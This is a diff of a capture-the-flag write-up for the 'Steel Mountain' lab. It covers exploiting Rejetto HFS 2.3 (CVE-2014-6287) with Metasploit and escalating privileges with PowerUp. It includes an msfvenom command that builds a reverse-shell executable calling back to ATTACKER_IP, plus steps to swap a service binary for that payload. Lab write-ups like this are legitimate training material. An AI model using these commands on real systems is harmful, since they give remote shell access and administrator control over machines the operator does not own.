@@ -11,9 +11,9 @@ tags:
   - powershell
 ---
 
-| Difficulty |
-| ---------- |
-|   Easy     |
+| Difficulty |  |  IP Address   |  |
+| ---------- |--|:------------: |--|
+|   Easy     |  |  10.10.213.55 |  |
 
 ---
 
@@ -35,7 +35,7 @@ To find out the name of the employee, we just have to save the image and his nam
 
 ![screenshot2](../assets/images/steel_mountain/screenshot2.png)
 
-Alternatively, we could also look at the **source code** to find out his name:
+Alternatively, we could also look at the source code to find out his name:
 
 ![screenshot3](../assets/images/steel_mountain/screenshot3.png)
 
@@ -47,7 +47,7 @@ Alternatively, we could also look at the **source code** to find out his name:
 
 ### [ Scan the machine with nmap. What is the other port running a web server on? ]
 
-Let's run a basic `nmap` scan (top 1000 ports) with the following command:
+Let's run a basic `nmap` scan (top 1000 ports) to enumerate the services running on the target:
 
 ``` 
 nmap -sC -sV -vv 10.10.213.55
@@ -65,13 +65,13 @@ Accessing the other web server running on port 8080, we come to this website:
 
 ![screenshot5](../assets/images/steel_mountain/screenshot5.png)
 
-We see that the file server running is the **Rejetto HTTP File Server**.
+Clicking on 'HttpFileServer 2.3' under 'Server Information' on the left tells us that the file server running is the **Rejetto HTTP File Server**.
 
 ---
 
 ### [ What is the CVE number to exploit this file server? ]
 
-From the webpage, we also see that the version of Rejetto being used is **2.3**. Doing a basic google search for this version, we can find the following [exploit](https://www.exploit-db.com/exploits/39161) on exploitdb:
+From the webpage, we also see that the version of Rejetto being used is **2.3**. Doing a Google search for exploits that exist for this version or Rejetto, we can find the following [exploit](https://www.exploit-db.com/exploits/39161) on ExploitDB:
 
 ![screenshot6](../assets/images/steel_mountain/screenshot6.png)
 
@@ -79,7 +79,7 @@ The CVE for the exploit is: **2014-6287**
 
 ---
 
-*I did not want to just use the exploit blindly, and wanted to at least have a bit of understanding of how it works. Doing some research, I found out that the exploit works by making use of an issue due to poor regex in the file **ParserLib.pas**:*
+*I did not want to use the exploit blindly and wanted to at least have a bit of understanding of how it works. Doing some research, I found out that the exploit works by making use of an issue due to poor regex in the file **ParserLib.pas**:*
 
 ```
 function findMacroMarker(s:string; ofs:integer=1):integer;
@@ -97,11 +97,11 @@ begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
 
 Now let's use metasploit to run this exploit. We load up metasploit by running `msfconsole`. 
 
-Next, after finding the exploit in `msfconsole`, we set the appropriate options before using it. The options look like this after I'm done:
+Next, after finding the exploit in `msfconsole`, we set the appropriate options before using it. In this case, we have to set the RHOSTS, RPORT, TARGETURI, LHOST and LPORT:
 
 ![screenshot7](../assets/images/steel_mountain/screenshot7.png)
 
-We can then run the exploit with `run`, which opens a meterpreter shell:
+Once ready, we run the exploit with `run`, which opens a meterpreter shell:
 
 ![screenshot8](../assets/images/steel_mountain/screenshot8.png)
 
@@ -121,7 +121,7 @@ We can then obtain **user.txt** located on bill's desktop:
 
 ### [ You can download the script here. Now you can use the upload command in Metasploit to upload the script.] 
 
-To download the PowerUp script, we simply git clone the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) repository onto our local machine. We then use Meterpreter's `upload` function to upload the PowerUp.ps1 file onto the target machine:
+To download the PowerUp script, we simply git clone the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) repository onto our local machine. We then use meterpreter's `upload` function to upload the PowerUp.ps1 file onto the target machine:
 
 ![screenshot11](../assets/images/steel_mountain/screenshot11.png)
 
@@ -147,11 +147,13 @@ Once in Powershell, we can run the PowerUp script with `. .\PowerUp.ps1`, follow
 
 ![screenshot14](../assets/images/steel_mountain/screenshot33.png)
 
-From the results, we find a service that has its **CanRestart** option set to **True**:
+From the results, we find a service that has its **CanRestart** option set to 'True':
 
 ![screenshot15](../assets/images/steel_mountain/screenshot15.png)
 
-Hence, the name of the unquoted service path name is: **AdvancedSystemCareService9**
+Hence, the name of the service is: **AdvancedSystemCareService9**
+
+Also, from the 'Path', we see that the executable file that is responsible for running this service is called **ASCService.exe**.
 
 ---
 
@@ -159,7 +161,9 @@ Hence, the name of the unquoted service path name is: **AdvancedSystemCareServic
 
 ### [ Use msfvenom to generate a reverse shell as an Windows executable. ]
 
-We want to open a reverse shell on the target machine. Let's first use `msfvenom` to generate the Windows reverse shell payload:
+Alright, let's open a reverse shell on the target machine. 
+
+To do so, we first use `msfvenom` to generate a Windows reverse shell payload:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
@@ -177,11 +181,11 @@ Navigating to the service directory, which is writable, we see the file that we 
 
 ![screenshot18](../assets/images/steel_mountain/screenshot18.png)
 
-Now, let's stop the service. From the PowerUp scan earlier, we saw that the restartable service is called **AdvancedSystemCare9**. We can stop this service with the `sc stop` command:
+Now, let's stop the service. From the PowerUp scan earlier, we saw that the restartable service is called 'AdvancedSystemCare9'. We can stop this service with the `sc stop` command:
 
 ![screenshot19](../assets/images/steel_mountain/screenshot19.png)
 
-Next, I copied our reverse shell file over to the service directory which contains the actual **ASCService.exe** file. This is done using the `copy` command.
+Next, I copied our reverse shell file over to the service directory which contains the actual 'ASCService.exe' file. This is done using the `copy` command.
 
 ```
 copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare"
@@ -189,7 +193,11 @@ copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare"
 
 There will be a prompt to check if we want to replace the existing ASCService.exe file, which we will say yes to.
 
+---
+
 *One thing to note is that I tried other methods to overwrite the ASCService.exe file, including moving the payload to the directory first, and trying to delete the original service file. That did not work as I kept getting 'access denied' error. Also, I had the payload named as 'advanced.exe' first, and when I tried to rename it to 'ASCService.exe' inside the service directory, it would not let me. It seems that the safest bet would be to rename the payload to 'ASCService.exe' first, before copying it over to the target directory.*
+
+---
 
 Before starting the service, let's run a netcat listener on our local machine to catch the connection:
 
